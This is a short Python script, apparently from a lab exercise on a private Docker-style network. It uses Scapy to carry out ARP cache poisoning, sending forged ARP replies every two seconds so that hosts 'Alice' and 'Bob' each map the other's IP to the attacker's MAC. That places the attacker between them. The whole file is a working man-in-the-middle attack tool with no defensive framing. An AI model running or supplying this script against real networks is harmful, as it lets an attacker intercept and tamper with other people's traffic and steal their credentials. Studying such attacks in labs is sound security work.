from scapy.all import Ether, ARP, sendp
import time

# IP Addresses
alice_ip = "172.31.0.2"
bob_ip = "172.31.0.3"

# MAC Addresses
alice_mac = "02:42:ac:1f:00:02"
bob_mac = "02:42:ac:1f:00:03"

def spoof():
    # 1. Tell Alice that Bob is at Mallory's MAC
    # We create an Ethernet frame (Ether) destined for Alice's MAC
    alice_packet = Ether(dst=alice_mac) / ARP(op=2, pdst=alice_ip, hwdst=alice_mac, psrc=bob_ip)
    sendp(alice_packet, verbose=False)
    
    # 2. Tell Bob that Alice is at Mallory's MAC
    bob_packet = Ether(dst=bob_mac) / ARP(op=2, pdst=bob_ip, hwdst=bob_mac, psrc=alice_ip)
    sendp(bob_packet, verbose=False)

print("ARP Poisoning started... (Warnings should be gone now)")
try:
    while True:
        spoof()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStopping.")